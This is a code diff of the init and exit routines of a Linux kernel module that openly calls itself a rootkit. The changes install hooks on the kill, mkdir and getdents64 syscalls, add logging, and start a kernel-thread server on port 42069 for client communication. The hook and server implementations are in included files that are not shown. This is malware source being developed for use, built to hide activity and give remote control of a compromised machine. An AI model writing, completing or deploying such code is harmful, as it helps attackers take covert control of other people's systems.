@@ -8,7 +8,10 @@ kernel module imports
 
 static int BUFFER_SIZE = 2048; //size of buffers used
 static char ROOTKIT_ID[] =  "Rootkit198760"; //id of the rootkit
-#include "custom/networking.c" //functions to run server and communicate with client
+
+
+#include "custom/log.c" //functions for file I/O and for
+#include "custom/server.c" //functions to run server and communicate with client
 #include "custom/syscall_table.c" //functions for getting sycall syscall_table
 #include "custom/hooks.c" //functions for hooking syscalls
 #include "custom/hooked_syscalls.c" //functions of the hooked syscalls
@@ -16,24 +19,23 @@ static char ROOTKIT_ID[] =  "Rootkit198760"; //id of the rootkit
 static void __exit ModuleExit(void) {
 	remove_hook(&sys_kill); //removes sys_kill hook
 	remove_hook(&sys_mkdir); //removes sys_mkdir hook
-	remove_hook(&sys_execve); //removes sys_execve hook
+	//remove_hook(&sys_execve); //removes sys_execve hook
 	remove_hook(&sys_getdents64); //removes sys_getdents64 hook
-	client_print("[rootkit] module removed!!!\n");
-	//remove_server();
+	log("[rootkit] module removed!!!\n");
+	remove_server();
 	printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
 }
 
 static int __init ModuleInit(void) {
-	printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
+	init_logging(); //enables logging abiltiy
+	printk(KERN_DEBUG "[rootkit] installed- ID=%s\n", ROOTKIT_ID); //DEBUG //DEBUG logs to dmesg
 	get_syscall_table(); //gets suyscall table
 	install_hook(&sys_kill); //installs sys_kill hook
 	install_hook(&sys_mkdir); //installs sys_mkdir hook
-	install_hook(&sys_execve); //installs sys_execve hook
+	//install_hook(&sys_execve); //installs sys_execve hook
 	install_hook(&sys_getdents64); //removes sys_getdents64 hook
-	//orig_execve = sys_execve.orig_syscall; //sets orig_execve to original syscall adress
-
 	unsigned short int port = 42069; //sets the port to set
-	//kthread_run(run_server, (void *) port, "server"); //runs the server
+	kthread_run(run_server, (void *) port, "server"); //runs the server
 	return 0;
 }
 
